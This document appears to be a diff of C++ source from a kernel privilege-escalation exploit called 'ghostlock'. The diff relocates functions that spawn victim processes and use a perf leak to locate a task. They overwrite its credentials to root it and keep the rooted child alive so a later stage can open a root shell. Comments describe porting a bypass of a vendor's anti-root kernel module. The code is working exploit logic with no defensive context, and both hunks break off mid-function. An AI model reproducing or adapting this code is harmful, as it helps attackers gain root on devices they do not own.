@@ -90,59 +90,6 @@ namespace ghostlock::session::backend {
             return verify(context) != 0;
         }
 
-        /* W3 chain retry: park the previous rooted child on its command pipe so the
-         * late-load stage can still start a root shell from it. */
-        void park_retry_child(ExploitSession &session, VictimChain &chain,
-                              const uint32_t round, const uint32_t chain_rounds) {
-            victim::VictimContext &pipes = session.victim;
-            pr_warning("W3 chain retry %u/%u: parking rooted child\n",
-                       round, chain_rounds);
-            if (chain.child_alive && pipes.child() > 0) {
-                write(pipes.cmd_write.get(), "P", 1);
-                usleep(50000);
-                session.parked_victim = pipes.release_child();
-                session.parked_victim_cmd = std::move(pipes.cmd_write);
-            } else {
-                pipes.cmd_write.reset();
-            }
-            pipes.uid_read.reset();
-            chain.child_alive = 1;
-            chain.seccomp_ok = 0;
-        }
-
-        /* Spawn one victim, clear the vivo tag (when built) and write the credential.
-         * Retry means the perf leak missed and the chain should respawn. */
-        template <class M>
-        VictimRound w2(ExploitSession &session, VictimChain &chain,
-                       victim::w2_stage_context &w2_context,
-                       uintptr_t &child_task) {
-            victim::VictimContext &pipes = session.victim;
-            int32_t &child_alive = chain.child_alive;
-
-            const auto spawned = victim::spawn_victim(pipes);
-            if (!spawned) {
-                pr_warning("fork failed\n");
-                return VictimRound::Failed;
-            }
-            child_task = spawned->task;
-            attack::timer_mark("perf_find_task done");
-
-            if (!child_task) {
-                /* nothing rooted yet; safe to kill and burn a round */
-                pr_warning("perf leak did not reproduce; retrying next round\n");
-                const pid_t unrooted = pipes.release_child();
-                if (unrooted > 0) {
-                    kill(-unrooted, SIGKILL);
-                    waitpid(unrooted, nullptr, 0);
-                }
-
-                child_alive = 0;
-                pipes.cmd_write.reset();
-                pipes.uid_read.reset();
-                return VictimRound::Retry;
-            }
-
-            pr_info("child_pid=%d child_task=0x%016zx\n", pipes.child(), child_task);
         /* /proc/modules probe (cached): is vivo's vr.ko (or a vr_* module)
          * loaded? Unreadable /proc/modules assumes loaded. Shared by the W1c
          * global disarm and the W2b per-task tag clear. */
@@ -211,6 +158,60 @@ namespace ghostlock::session::backend {
                 pr_warning("W1c write missed; relying on the per-task tag clear\n");
             }
         }
+
+        /* W3 chain retry: park the previous rooted child on its command pipe so the
+         * late-load stage can still start a root shell from it. */
+        void park_retry_child(ExploitSession &session, VictimChain &chain,
+                              const uint32_t round, const uint32_t chain_rounds) {
+            victim::VictimContext &pipes = session.victim;
+            pr_warning("W3 chain retry %u/%u: parking rooted child\n",
+                       round, chain_rounds);
+            if (chain.child_alive && pipes.child() > 0) {
+                write(pipes.cmd_write.get(), "P", 1);
+                usleep(50000);
+                session.parked_victim = pipes.release_child();
+                session.parked_victim_cmd = std::move(pipes.cmd_write);
+            } else {
+                pipes.cmd_write.reset();
+            }
+            pipes.uid_read.reset();
+            chain.child_alive = 1;
+            chain.seccomp_ok = 0;
+        }
+
+        /* Spawn one victim, clear the vivo tag (when built) and write the credential.
+         * Retry means the perf leak missed and the chain should respawn. */
+        template <class M>
+        VictimRound w2(ExploitSession &session, VictimChain &chain,
+                       victim::w2_stage_context &w2_context,
+                       uintptr_t &child_task) {
+            victim::VictimContext &pipes = session.victim;
+            int32_t &child_alive = chain.child_alive;
+
+            const auto spawned = victim::spawn_victim(pipes);
+            if (!spawned) {
+                pr_warning("fork failed\n");
+                return VictimRound::Failed;
+            }
+            child_task = spawned->task;
+            attack::timer_mark("perf_find_task done");
+
+            if (!child_task) {
+                /* nothing rooted yet; safe to kill and burn a round */
+                pr_warning("perf leak did not reproduce; retrying next round\n");
+                const pid_t unrooted = pipes.release_child();
+                if (unrooted > 0) {
+                    kill(-unrooted, SIGKILL);
+                    waitpid(unrooted, nullptr, 0);
+                }
+
+                child_alive = 0;
+                pipes.cmd_write.reset();
+                pipes.uid_read.reset();
+                return VictimRound::Retry;
+            }
+
+            pr_info("child_pid=%d child_task=0x%016zx\n", pipes.child(), child_task);
             /* ------------------------------------------------------------------
          * vivo vr.ko anti-root per-task bypass (ported from root.c)
          * ------------------------------------------------------------------
